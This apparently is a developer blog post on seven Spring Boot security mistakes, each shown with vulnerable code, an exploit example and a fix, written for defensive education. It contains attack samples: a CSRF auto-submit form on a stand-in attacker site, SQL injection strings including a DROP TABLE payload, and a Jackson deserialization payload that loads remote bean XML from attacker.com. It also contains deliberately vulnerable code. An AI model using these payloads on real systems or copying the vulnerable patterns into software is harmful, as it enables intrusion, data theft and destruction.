---
title: "7 Spring Boot Security Mistakes That Will Get You Hacked"
date: 2026-08-24
categories: [Spring Boot, Security]
tags: [spring-boot, security, java, owasp, vulnerabilities]
description: "Real vulnerabilities found during production code reviews — with the exploit, the impact, and the fix for each one."
mermaid: true
---
## Why I'm Writing This

Over the past 17 years, I've reviewed hundreds of Spring Boot applications across banking, fintech, and e-commerce companies in Singapore. The same security mistakes keep showing up — not because developers are careless, but because Spring Boot makes it easy to build features fast while leaving security as an afterthought.

Every vulnerability in this article came from a real production system. I've anonymized the details, but the code patterns are exactly what I found. If you recognize your codebase in any of these — fix it today.

## Mistake #1: Exposed Actuator Endpoints

### The Exploit

Spring Boot Actuator gives you health checks, metrics, thread dumps, and environment variables. By default in older versions, many endpoints were accessible without authentication.

```java
// application.yml — the "I'll secure it later" configuration
management:
  endpoints:
    web:
      exposure:
        include: "*"
  endpoint:
    env:
      show-values: ALWAYS
    health:
      show-details: ALWAYS
```

An attacker discovers `/actuator/env` and gets:

```json
{
  "propertySources": [
    {
      "name": "systemEnvironment",
      "properties": {
        "DB_PASSWORD": { "value": "pr0duction_p@ss!" },
        "AWS_SECRET_ACCESS_KEY": { "value": "wJalrXUtnFEMI/K7MDENG..." },
        "JWT_SECRET": { "value": "mySuper$ecretKey2024" }
      }
    }
  ]
}
```

Game over. They now have database credentials and AWS keys.

Even worse: `/actuator/heapdump` lets an attacker download a full heap dump and extract every secret in memory.

### The Fix

```java
// application.yml — production-safe configuration
management:
  endpoints:
    web:
      exposure:
        include: health, info, prometheus
      base-path: /internal/management
  endpoint:
    env:
      show-values: NEVER
    health:
      show-details: WHEN_AUTHORIZED
```

```java
@Configuration
@EnableWebSecurity
public class ActuatorSecurityConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain actuatorSecurityChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/internal/management/**")
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/internal/management/health").permitAll()
                .requestMatchers("/internal/management/prometheus").permitAll()
                .anyRequest().hasRole("ACTUATOR_ADMIN")
            )
            .httpBasic(Customizer.withDefaults());
        return http.build();
    }
}
```

**Rules:**
- Never expose `env`, `heapdump`, `threaddump`, or `beans` externally
- Change the base path from the default `/actuator`
- Use a separate security chain with strict access control
- In Kubernetes, expose actuator only on a separate management port

## Mistake #2: Disabled CSRF Without Understanding the Consequences

### The Exploit

I see this in almost every Spring Boot REST API:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.csrf(csrf -> csrf.disable()); // "It's a REST API, we don't need CSRF"
    return http.build();
}
```

If your API uses **cookie-based authentication** (session cookies, remember-me cookies), disabling CSRF means any website can forge requests on behalf of your logged-in users.

The attacker hosts this on `evil-site.com`:

```html
<form action="https://your-bank.com/api/transfer" method="POST" id="exploit">
    <input type="hidden" name="toAccount" value="ATTACKER-ACCT" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('exploit').submit();</script>
```

When a logged-in user visits the attacker's page, their browser automatically includes the session cookie, and the transfer executes.

### The Fix

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
        .ignoringRequestMatchers("/api/webhooks/**") // Only for stateless webhook endpoints
    );
    return http.build();
}
```

**When it's actually safe to disable CSRF:**
- Your API uses **only** token-based auth (Bearer tokens in headers)
- No session cookies, no remember-me cookies
- Tokens are never stored in cookies

If you use token auth exclusively, CSRF protection is redundant because the browser won't automatically include an `Authorization` header. But document WHY you disabled it:

```java
http.csrf(csrf -> csrf.disable()); // SAFE: API uses Bearer token auth only, no cookies
```

## Mistake #3: SQL Injection via JPA Native Queries

### The Exploit

"We use JPA, so SQL injection is impossible." Wrong. I've found injection vulnerabilities in every second codebase that uses native queries:

```java
@Repository
public interface ProductRepository extends JpaRepository<Product, Long> {

    // VULNERABLE: String concatenation in native query
    @Query(value = "SELECT * FROM products WHERE category = '" + "#{#category}" + 
           "' AND name LIKE '%" + "#{#search}" + "%'", nativeQuery = true)
    List<Product> searchProducts(@Param("category") String category, 
                                 @Param("search") String search);
}
```

Or the even more common pattern with EntityManager:

```java
@Repository
public class ProductSearchRepository {

    @PersistenceContext
    private EntityManager em;

    // VULNERABLE: Direct string concatenation
    public List<Product> search(String category, String sortBy) {
        String sql = "SELECT * FROM products WHERE category = '" + category + 
                     "' ORDER BY " + sortBy;
        return em.createNativeQuery(sql, Product.class).getResultList();
    }
}
```

An attacker sends: `category = ' OR '1'='1' --` and dumps your entire product table. With `sortBy = "price; DROP TABLE products; --"` they destroy data.

### The Fix

```java
@Repository
public class ProductSearchRepository {

    @PersistenceContext
    private EntityManager em;

    private static final Set<String> ALLOWED_SORT_FIELDS = 
        Set.of("name", "price", "created_at", "stock_quantity");

    public List<Product> search(String category, String sortBy) {
        // Whitelist validation for column names (can't be parameterized)
        if (!ALLOWED_SORT_FIELDS.contains(sortBy)) {
            throw new IllegalArgumentException("Invalid sort field: " + sortBy);
        }

        // Parameterized query for values
        String sql = "SELECT * FROM products WHERE category = :category ORDER BY " + sortBy;
        return em.createNativeQuery(sql, Product.class)
            .setParameter("category", category)
            .getResultList();
    }
}
```

For Spring Data JPA repositories:

```java
@Repository
public interface ProductRepository extends JpaRepository<Product, Long> {

    // SAFE: Using parameter binding
    @Query(value = "SELECT * FROM products WHERE category = :category AND name LIKE :search",
           nativeQuery = true)
    List<Product> searchProducts(@Param("category") String category,
                                 @Param("search") String search);
}
```

**Rules:**
- Always use parameterized queries for values
- Whitelist-validate column/table names (they can't be parameterized)
- Use Criteria API or QueryDSL for complex dynamic queries
- Never concatenate user input into SQL strings

## Mistake #4: Insecure Deserialization

### The Exploit

Jackson's polymorphic deserialization is a well-known attack vector. If your API accepts JSON with type information, an attacker can instantiate arbitrary classes:

```java
// VULNERABLE: Enabling default typing globally
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); // DANGEROUS
    return mapper;
}
```

Or the Redis serializer that trusts all classes:

```java
// VULNERABLE: Trusting all classes during deserialization
@Bean
public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory factory) {
    RedisTemplate<String, Object> template = new RedisTemplate<>();
    template.setConnectionFactory(factory);

    ObjectMapper mapper = new ObjectMapper();
    mapper.activateDefaultTyping(
        mapper.getPolymorphicTypeValidator(),
        ObjectMapper.DefaultTyping.EVERYTHING  // DANGEROUS
    );

    template.setValueSerializer(new GenericJackson2JsonRedisSerializer(mapper));
    return template;
}
```

An attacker crafts a payload that chains gadget classes (like those in ysoserial) to achieve Remote Code Execution:

```json
{
  "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
  "configLocation": "https://attacker.com/malicious-beans.xml"
}
```

### The Fix

```java
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();
    // If you MUST use polymorphic typing, use a strict validator
    mapper.activateDefaultTyping(
        BasicPolymorphicTypeValidator.builder()
            .allowIfSubType("com.yourcompany.dto.")  // Only your DTOs
            .allowIfSubType("java.util.")            // Basic collections
            .denyForExactBaseType(Object.class)
            .build(),
        ObjectMapper.DefaultTyping.NON_FINAL
    );
    return mapper;
}

// Better: Use explicit @JsonTypeInfo on specific classes that need it
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY)
@JsonSubTypes({
    @JsonSubTypes.Type(value = CreditPayment.class, name = "credit"),
    @JsonSubTypes.Type(value = DebitPayment.class, name = "debit")
})
public abstract class Payment { }
```

**Rules:**
- Never enable `DefaultTyping.EVERYTHING` or `NON_FINAL` without a strict validator
- Prefer explicit `@JsonTypeInfo` annotations over global default typing
- Keep Jackson and all serialization libraries updated
- Use allowlists, never denylists, for type resolution

## Mistake #5: Hardcoded Secrets

### The Exploit

I still find this in 2024:

```yaml
# application.yml — committed to Git
spring:
  datasource:
    url: jdbc:postgresql://prod-db.internal:5432/finance
    username: app_user
    password: Fin@nce2024!Prod
  
jwt:
  secret: mySuperSecretJWTKey123!@#
  
aws:
  access-key-id: AKIAIOSFODNN7EXAMPLE
  secret-access-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

Once this is in Git, it's in every developer's laptop, every CI server, and potentially every fork. Rotating the secret means you also need to scrub Git history — which nobody does properly.

### The Fix

```yaml
# application.yml — references only, no values
spring:
  datasource:
    url: ${DB_URL}
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}

jwt:
  secret: ${JWT_SECRET}
```

For production, use a secrets manager:

```java
@Configuration
@Profile("prod")
public class SecretsConfig {

    @Bean
    public DataSource dataSource(
            @Value("${aws.secretsmanager.db-secret-id}") String secretId,
            SecretsManagerClient secretsClient) {

        String secretJson = secretsClient.getSecretValue(
            GetSecretValueRequest.builder().secretId(secretId).build()
        ).secretString();

        var creds = new ObjectMapper().readValue(secretJson, DbCredentials.class);

        var config = new HikariConfig();
        config.setJdbcUrl(creds.url());
        config.setUsername(creds.username());
        config.setPassword(creds.password());
        return new HikariDataSource(config);
    }
}
```

**Prevention checklist:**
- Add `application-prod.yml` to `.gitignore`
- Use git-secrets or truffleHog in CI pipelines
- Store secrets in AWS Secrets Manager, HashiCorp Vault, or Kubernetes Secrets
- Rotate secrets regularly with automated rotation
- Use Spring Cloud Config Server with encrypted values for shared config

## Mistake #6: Missing Rate Limiting

### The Exploit

Without rate limiting, your API is vulnerable to:
- **Brute force attacks** on login endpoints
- **Credential stuffing** using leaked databases
- **API abuse** causing high infrastructure costs
- **DDoS** at the application layer

I reviewed a fintech app where the login endpoint had no rate limiting. An attacker ran a credential stuffing attack with 50,000 stolen email/password combos at 1,000 requests/second. They compromised 340 accounts in under a minute.

### The Fix

Implement multi-level rate limiting:

```java
@Configuration
public class RateLimitConfig {

    @Bean
    public KeyResolver userKeyResolver() {
        return exchange -> Mono.just(
            exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()
        );
    }
}
```

Custom rate limiter with sliding window:

```java
@Component
public class SlidingWindowRateLimiter {

    private final StringRedisTemplate redisTemplate;

    public SlidingWindowRateLimiter(StringRedisTemplate redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public boolean isAllowed(String key, int maxRequests, Duration window) {
        String redisKey = "rate_limit:" + key;
        long now = Instant.now().toEpochMilli();
        long windowStart = now - window.toMillis();

        // Remove expired entries and count current window
        redisTemplate.opsForZSet().removeRangeByScore(redisKey, 0, windowStart);
        Long count = redisTemplate.opsForZSet().zCard(redisKey);

        if (count != null && count >= maxRequests) {
            return false;
        }

        // Add current request
        redisTemplate.opsForZSet().add(redisKey, String.valueOf(now), now);
        redisTemplate.expire(redisKey, window.plusSeconds(1));
        return true;
    }
}
```

Apply it as a filter:

```java
@Component
@Order(1)
public class RateLimitFilter extends OncePerRequestFilter {

    private final SlidingWindowRateLimiter rateLimiter;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws ServletException, IOException {

        String clientIp = getClientIp(request);
        String endpoint = request.getRequestURI();

        // Stricter limits for auth endpoints
        int maxRequests = endpoint.startsWith("/api/auth") ? 5 : 100;
        Duration window = endpoint.startsWith("/api/auth") 
            ? Duration.ofMinutes(1) : Duration.ofSeconds(10);

        if (!rateLimiter.isAllowed(clientIp + ":" + endpoint, maxRequests, window)) {
            response.setStatus(429);
            response.setHeader("Retry-After", "60");
            response.getWriter().write("{\"error\":\"Rate limit exceeded\"}");
            return;
        }

        chain.doFilter(request, response);
    }

    private String getClientIp(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}
```

**Rate limiting strategy:**

**Login endpoint** — 5 attempts per minute per IP

**Password reset** — 3 requests per hour per email

**General API** — 100 requests per 10 seconds per user

**Admin endpoints** — 20 requests per minute per user

## Mistake #7: Broken Access Control (IDOR)

### The Exploit

This is OWASP's #1 vulnerability for a reason. I see it constantly:

```java
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    @GetMapping("/{accountId}/balance")
    public Balance getBalance(@PathVariable Long accountId) {
        // VULNERABLE: No ownership verification!
        return accountService.getBalance(accountId);
    }

    @PutMapping("/{accountId}/email")
    public void updateEmail(@PathVariable Long accountId,
                           @RequestBody EmailUpdateRequest request) {
        // VULNERABLE: Any authenticated user can change any account's email
        accountService.updateEmail(accountId, request.getEmail());
    }
}
```

An attacker simply iterates account IDs: `/api/accounts/1/balance`, `/api/accounts/2/balance`, etc. They can view every user's balance and modify their email (enabling account takeover via password reset).

### The Fix

```java
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    @GetMapping("/{accountId}/balance")
    public Balance getBalance(@PathVariable Long accountId, Authentication auth) {
        // Verify ownership before any data access
        accountService.verifyOwnership(accountId, auth.getName());
        return accountService.getBalance(accountId);
    }

    @PutMapping("/{accountId}/email")
    @PreAuthorize("@accountSecurity.isOwner(#accountId, authentication)")
    public void updateEmail(@PathVariable Long accountId,
                           @RequestBody @Valid EmailUpdateRequest request) {
        accountService.updateEmail(accountId, request.getEmail());
    }
}

@Component("accountSecurity")
public class AccountSecurityEvaluator {

    private final AccountRepository accountRepository;

    public boolean isOwner(Long accountId, Authentication authentication) {
        String username = authentication.getName();
        return accountRepository.findById(accountId)
            .map(account -> account.getOwnerUsername().equals(username))
            .orElse(false);
    }

    public boolean isOwnerOrAdmin(Long accountId, Authentication authentication) {
        if (authentication.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"))) {
            return true;
        }
        return isOwner(accountId, authentication);
    }
}
```

### A Better Pattern: Eliminate Direct ID References

```java
@RestController
@RequestMapping("/api/my-account")
public class MyAccountController {

    @GetMapping("/balance")
    public Balance getBalance(Authentication auth) {
        // No account ID in URL — derived from authenticated user
        return accountService.getBalanceForUser(auth.getName());
    }

    @PutMapping("/email")
    public void updateEmail(@RequestBody @Valid EmailUpdateRequest request,
                           Authentication auth) {
        accountService.updateEmailForUser(auth.getName(), request.getEmail());
    }
}
```

When you must use resource IDs (admin panels, support tools), use UUIDs instead of sequential integers to prevent enumeration:

```java
@Entity
public class Account {
    @Id
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id; // Can't enumerate UUIDs
}
```

## The Security Review Checklist

Before every production deployment, verify:

- **Actuator** — Only health and metrics exposed, custom base path, authenticated access
- **CSRF** — Enabled unless using pure token-based auth (documented reason)
- **SQL** — All queries parameterized, dynamic columns whitelisted
- **Deserialization** — No global default typing, strict type validators
- **Secrets** — Zero credentials in source code, secrets manager in production
- **Rate limiting** — Auth endpoints limited to 5/min, API endpoints appropriately throttled
- **Access control** — Every endpoint verifies resource ownership, no direct object references without authorization checks

## Final Thought

Security isn't a feature you add at the end. It's a discipline you practice on every pull request. The exploits in this article took me seconds to find during code reviews. An attacker with automated tools will find them even faster.

Pick one mistake from this list that's in your codebase right now. Fix it today. Then fix the next one tomorrow. That's how you build secure systems — one vulnerability at a time.
